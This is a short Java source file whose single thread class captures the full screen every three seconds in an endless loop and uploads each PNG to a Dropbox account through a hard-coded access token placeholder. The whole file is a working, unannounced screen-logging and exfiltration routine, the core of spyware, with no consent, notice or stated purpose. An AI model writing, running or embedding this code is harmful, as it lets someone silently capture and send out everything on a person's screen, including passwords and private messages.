import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;

public class MyThread extends Thread
{
    @Override
    public void run()
    {
        String ACCESS_TOKEN ="Add your access token";
        DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
        DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);
        SimpleDateFormat dateFormat = new SimpleDateFormat("yyyyMMdd_HHmmss");
        String dateName = null;

       for(;;)
       {
           try{
               Robot robot = null;
               robot = new Robot();
               BufferedImage screenShot = robot.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
               ByteArrayOutputStream os = new ByteArrayOutputStream();
               ImageIO.write(screenShot, "png", os);
               InputStream is = new ByteArrayInputStream(os.toByteArray());
               dateName = dateFormat.format(Calendar.getInstance().getTime());
               client.files().uploadBuilder("/" + dateName + ".png").uploadAndFinish(is);
               Thread.sleep(3000);
       }
           catch(Exception ex){
               ex.printStackTrace();
          }
       }
    }
}
